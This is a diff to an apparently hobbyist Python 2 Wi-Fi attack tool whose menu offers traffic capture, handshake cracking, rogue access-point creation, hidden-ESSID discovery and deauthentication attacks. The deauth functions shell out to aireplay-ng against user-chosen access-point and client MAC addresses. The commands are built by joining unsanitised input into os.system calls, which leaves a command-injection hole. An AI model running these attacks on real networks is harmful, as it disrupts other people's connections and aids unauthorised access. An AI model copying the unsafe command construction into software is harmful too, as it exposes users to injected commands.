@@ -4,19 +4,28 @@ import os
 import sys
 import time
 from wifi import Cell, Scheme
-'''
-interfaz = 'wlxc04a00118487'
-interfaz = 'wlxe894f609bffc'
-'''
-interfaz = raw_input('Network interface: ')
-#os.system("sudo ifconfig "+interfaz+" down")
-#os.system("sudo iwconfig "+interfaz+" mode managed")
-os.system("sudo ifconfig "+interfaz+" up")
+import config
+from hidden import find_hidden_essid
+
+
+interfaz = config.default_interface if config.default_interface is not '' else raw_input('Network interface: ')
 redes = []
 
 
+def setManagedMode():
+	os.system("sudo ifconfig "+interfaz+" down")
+	os.system("sudo iwconfig "+interfaz+" mode managed")
+	os.system("sudo ifconfig "+interfaz+" up")
+
+
+def setMonitorMode():
+	os.system("sudo ifconfig "+interfaz+" down")
+	os.system("sudo iwconfig "+interfaz+" mode monitor")
+	os.system("sudo ifconfig "+interfaz+" up")
+
+
 def menu():
-	opt_ = raw_input('\nOptions: \n1: Scan \n2: Capture traffic (Airodump) \n3: Crack handshake \n4: Deauth attack \n5: Create AP \n6: Connect\n')
+	opt_ = raw_input('\nOptions: \n1: Scan \n2: Capture traffic (Airodump) \n3: Crack handshake \n4: Deauth attack \n5: Create AP \n6: Connect \n7: Get hidden ESSID\n')
 	if   opt_ == "1":
 		scan()
 		menu()
@@ -29,7 +38,9 @@ def menu():
 	elif opt_=="5":
 		create_ap()
 	elif opt_=="6":
-		connect()	
+		connect()
+	elif opt_=="7":
+		get_hidden_essid()	
 	else:
 		print "Unknown option"
 
@@ -90,9 +101,7 @@ def deauth_client():
 	essid=red.get("ssid")
 	channel=red.get("canal")
 	client_mac = raw_input("Client MAC:")
-	#os.system("sudo ifconfig "+interfaz+" down")
-	#os.system("sudo iwconfig "+interfaz+" mode monitor")
-	#os.system("sudo ifconfig "+interfaz+" up")
+	setMonitorMode()
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
 	os.system("sudo aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e \""+essid+"\" "+interfaz)
 
@@ -104,9 +113,7 @@ def deauth_ap():
 	ap_mac=red.get("mac")
 	essid=red.get("ssid")
 	channel=red.get("canal")
-	#os.system("sudo ifconfig "+interfaz+" down")
-	#os.system("sudo iwconfig "+interfaz+" mode monitor")
-	#os.system("sudo ifconfig "+interfaz+" up")
+	setMonitorMode()
 	os.system("sudo iwconfig "+interfaz+" channel "+channel)
 	cmmd= ("sudo aireplay-ng -0 0 -a "+ap_mac+" -e \""+essid+"\" "+interfaz)
 	os.system(cmmd)
@@ -165,12 +172,15 @@ def scan():
 	global redes
 	list_ = []
 	redes = []
+	setManagedMode()
 	print "\nScanning...\n"
 	sec_counter = 0
 	while len(list_) == 0:
 		sec_counter+=1
-		time.sleep(0.5)
-		if sec_counter==60:
+		time.sleep(1)
+		if sec_counter==20:
+			print "0 networks found"
+			sys.exit()
 			break
 		list_ = Cell.all(interfaz)
 	count = 0
@@ -192,8 +202,20 @@ def scan():
 		print str_format.format(red.get("id"), red.get("ssid"), red.get("canal"), red.get("cifrado"), red.get("mac"))
 	print ""
 
+def get_hidden_essid():
+	scan()
+	id_red = raw_input('Select id: ')
+	red=redes[int(id_red)]
+	if red is not None:
+		ap_mac=red.get("mac")
+		channel=red.get("canal")
+		find_hidden_essid(interfaz,ap_mac,channel)
+	else:
+		print "No funciona"
+
 
 def main():
+	setManagedMode()
 	menu()
 
 
